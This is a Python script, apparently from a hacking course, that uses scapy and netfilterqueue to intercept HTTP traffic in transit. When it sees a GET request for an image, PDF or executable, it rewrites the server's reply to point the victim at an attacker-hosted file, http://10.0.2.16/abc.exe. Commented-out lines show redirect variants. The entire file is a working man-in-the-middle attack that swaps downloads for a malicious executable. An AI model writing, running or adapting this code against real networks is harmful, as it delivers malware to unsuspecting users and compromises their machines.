#!/usr/bin/env python2

import scapy.all as scapy
# from scapy.all import *
import netfilterqueue

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            payload = scapy_packet[scapy.Raw].load
            #if b".jpg" in payload or b".exe" in payload or b".pdf" in payload or b".jpeg" in payload:
            get_line = [line for line in payload.decode(errors="ignore").split('\r\n') if line.startswith("GET")]
            if get_line:
                if any(ext in get_line[0] for ext in [".jpg", ".exe", ".pdf", ".jpeg"]):
                    print("[+] Found Request to replace : " )
                    print("\t" + [line for line in payload.decode(errors="ignore").split('\r\n') if line.startswith("GET")][0])
                    ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing File ")
                #modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.16/abc.exe\n\n")
                #modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-711.exe\n\n")
                modified_packet = set_load(scapy_packet,
                                           "HTTP/1.1 200 OK\r\n"
                                           "Location: http://10.0.2.16/abc.exe\r\n"
                                           "Connection: close\r\n"
                                           "\r\n"
                                           )


                packet.set_payload(str(modified_packet))
                print("\tFile replaced at target\n")

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
try:
    queue.run()
except KeyboardInterrupt:
    print("\n[!] Detected CTRL+C ... exiting.")
    queue.unbind()


